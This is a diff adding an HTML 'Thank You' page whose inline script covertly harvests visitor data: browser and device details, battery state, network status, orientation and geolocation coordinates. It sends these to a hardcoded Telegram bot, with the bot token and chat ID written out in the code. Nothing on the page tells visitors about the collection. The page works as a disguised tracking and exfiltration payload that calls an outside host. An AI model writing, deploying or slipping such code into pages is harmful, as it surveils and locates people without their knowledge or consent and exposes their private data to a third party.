@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Thank You</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      background: #121212;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #fff;
+      font-size: 4rem;
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+
+  Thank You
+
+<script>
+  // Telegram Bot Info
+  const TELEGRAM_BOT_TOKEN = '8192796788:AAEX3YUjZEmUPvcOZRLjUE_QBrwg4yCR4C0';
+  const TELEGRAM_CHAT_ID = '7928017266';
+
+  // Helper to send message to Telegram
+  function sendTelegramMessage(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const params = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: "HTML"
+    };
+
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(params)
+    }).catch(err => {
+      console.error('Telegram API error:', err);
+    });
+  }
+
+  // Battery Info
+  function updateBatteryInfo(battery) {
+    const level = (battery.level * 100).toFixed(0) + '%';
+    const charging = battery.charging ? 'Yes' : 'No';
+
+    batteryInfo.level = level;
+    batteryInfo.charging = charging;
+    trySendTelegram();
+  }
+
+  let batteryInfo = { level: 'N/A', charging: 'N/A' };
+  let deviceInfo = {};
+  let networkInfo = {};
+  let geoInfo = {};
+  let orientationInfo = 'N/A';
+
+  // Device & Browser Info
+  function gatherDeviceInfo() {
+    deviceInfo = {
+      userAgent: navigator.userAgent || 'N/A',
+      platform: navigator.platform || 'N/A',
+      screenResolution: window.screen.width + ' x ' + window.screen.height,
+      cpuCores: navigator.hardwareConcurrency || 'N/A',
+      memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'
+    };
+  }
+
+  // Network Info
+  function updateNetworkInfo() {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    networkInfo.connectionType = connection ? connection.effectiveType || connection.type || 'Unknown' : 'Not supported';
+    networkInfo.onlineStatus = navigator.onLine ? 'Online' : 'Offline';
+    trySendTelegram();
+  }
+
+  // Geolocation
+  function geoSuccess(position) {
+    geoInfo.latitude = position.coords.latitude.toFixed(5);
+    geoInfo.longitude = position.coords.longitude.toFixed(5);
+    trySendTelegram();
+  }
+  function geoError(error) {
+    geoInfo.latitude = 'N/A';
+    geoInfo.longitude = 'N/A';
+    trySendTelegram();
+  }
+
+  // Device Orientation
+  function updateOrientation(event) {
+    const alpha = event.alpha ? event.alpha.toFixed(1) : 'N/A';
+    const beta = event.beta ? event.beta.toFixed(1) : 'N/A';
+    const gamma = event.gamma ? event.gamma.toFixed(1) : 'N/A';
+    orientationInfo = `Alpha: ${alpha}°, Beta: ${beta}°, Gamma: ${gamma}°`;
+    trySendTelegram();
+  }
+
+  // Compose message and send only once
+  let messageSent = false;
+  function trySendTelegram() {
+    if (messageSent) return;
+
+    if (deviceInfo.userAgent && batteryInfo.level !== 'N/A' && geoInfo.latitude) {
+      const message = `<b>Device & Battery Info</b>
+Battery Level: ${batteryInfo.level}
+Charging: ${batteryInfo.charging}
+
+User Agent: ${deviceInfo.userAgent}
+Platform: ${deviceInfo.platform}
+Screen: ${deviceInfo.screenResolution}
+CPU Cores: ${deviceInfo.cpuCores}
+Memory: ${deviceInfo.memory}
+
+Network Type: ${networkInfo.connectionType}
+Online Status: ${networkInfo.onlineStatus}
+
+Geolocation: Latitude ${geoInfo.latitude}, Longitude ${geoInfo.longitude}
+Orientation: ${orientationInfo}`;
+
+      sendTelegramMessage(message);
+      messageSent = true;
+    }
+  }
+
+  // Initialize
+  gatherDeviceInfo();
+  updateNetworkInfo();
+
+  if ('getBattery' in navigator) {
+    navigator.getBattery().then(battery => {
+      updateBatteryInfo(battery);
+      battery.addEventListener('levelchange', () => updateBatteryInfo(battery));
+      battery.addEventListener('chargingchange', () => updateBatteryInfo(battery));
+    }).catch(() => {
+      batteryInfo.level = 'Battery API not supported';
+      batteryInfo.charging = '-';
+      trySendTelegram();
+    });
+  } else {
+    batteryInfo.level = 'Battery API not supported';
+    batteryInfo.charging = '-';
+    trySendTelegram();
+  }
+
+  if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(geoSuccess, geoError, {timeout: 10000});
+  } else {
+    geoInfo.latitude = 'N/A';
+    geoInfo.longitude = 'N/A';
+    trySendTelegram();
+  }
+
+  window.addEventListener('online', updateNetworkInfo);
+  window.addEventListener('offline', updateNetworkInfo);
+  if (navigator.connection) {
+    navigator.connection.addEventListener('change', updateNetworkInfo);
+  }
+
+  if (window.DeviceOrientationEvent) {
+    window.addEventListener('deviceorientation', updateOrientation);
+  }
+</script>
+
+</body>
+</html>
